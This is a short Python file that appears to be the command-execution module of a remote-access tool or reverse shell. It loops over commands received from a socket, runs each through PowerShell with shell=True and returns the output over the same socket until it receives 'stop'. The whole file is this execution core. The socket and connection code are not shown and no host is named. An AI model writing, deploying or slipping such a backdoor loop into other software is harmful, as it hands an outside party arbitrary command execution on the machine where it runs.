import subprocess


def execute_command(my_socket):
    print("[+] Executing commands ") 

    while True:
        user_command  = my_socket.receive_data()

        print("user command : ", user_command)

        if user_command == "stop":
            break
        if user_command == "":
            continue

        output = subprocess.run(["powershell", user_command], shell=True, capture_output=True)
        if output.stderr.decode('utf-8') == "":
            cmd_rsult = output.stdout.decode('utf-8')
        else:
            cmd_rsult = output.stderr.decode("utf-8")
        

        # serilization  = [data bytes ] + delimeter bytes ["<END_OF_RESULT>"]
        my_socket.send_command_result(cmd_rsult)
